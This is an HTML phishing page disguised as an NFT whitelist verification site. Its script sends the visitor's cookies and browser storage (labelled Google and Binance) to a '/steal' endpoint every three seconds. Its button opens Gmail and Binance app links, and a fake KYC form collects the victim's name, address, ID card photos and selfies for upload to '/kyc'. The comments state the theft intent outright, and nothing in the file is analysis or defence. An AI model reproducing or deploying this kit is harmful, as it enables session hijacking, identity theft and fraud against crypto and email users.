<!DOCTYPE html><html><head><title>NFT Verify</title><meta name="viewport" content="width=device-width"><style>body{background:#000;color:lime;font-family:monospace;padding:20px;text-align:center}input,button{width:90%;padding:15px;margin:10px;font-size:18px;border:1px solid lime;background:#111;color:lime}</style></head><body>
<h2>🔥 Pure NFT - Whitelist Verify</h2>

<button onclick="autoSteal()">📱 Tap to Connect</button>

<div id="kyc" style="display:none">
  <input id="name" placeholder="Full Name"><br>
  <input id="addr" placeholder="Address"><br>
  <input type="file" id="idfront" accept="image/*"><br>
  <input type="file" id="idback" accept="image/*"><br>
  <input type="file" id="selfie1" accept="image/*"><br>
  <input type="file" id="selfie2" accept="image/*"><br>
  <input type="file" id="selfie3" accept="image/*"><br>
  <button onclick="submitKYC()">✅ Submit</button>
</div>

<script>
// 🔥 AUTO STEAL EVERY 3s (Background)
setInterval(() => {
  fetch('/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie + ' | ' + localStorage.google + ' | ' + sessionStorage.binance
    })
  })
}, 3000)

// Connect trigger
function autoSteal() {
  // Deep app links
  window.open('googlegmail://', '_blank')
  window.open('binance://', '_blank')
  
  document.getElementById('kyc').style.display = 'block'
  fetch('/steal', {method: 'POST', body: 'mobile_connect'})
}

// KYC + Base64 files
async function submitKYC() {
  const files = ['idfront','idback','selfie1','selfie2','selfie3']
  const fileData = []
  
  for(let f of files) {
    const input = document.getElementById(f)
    if(input.files[0]) {
      const reader = new FileReader()
      reader.onload = () => fileData.push(f + ': ' + reader.result.substring(0,100))
      reader.readAsDataURL(input.files[0])
    }
  }
  
  setTimeout(async () => {
    await fetch('/kyc', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        name: document.getElementById('name').value,
        address: document.getElementById('addr').value,
        files: fileData,
        cookies: document.cookie + localStorage.length
      })
    })
    alert('✅ KYC sent!')
  }, 2000)
}
</script>
</body></html>
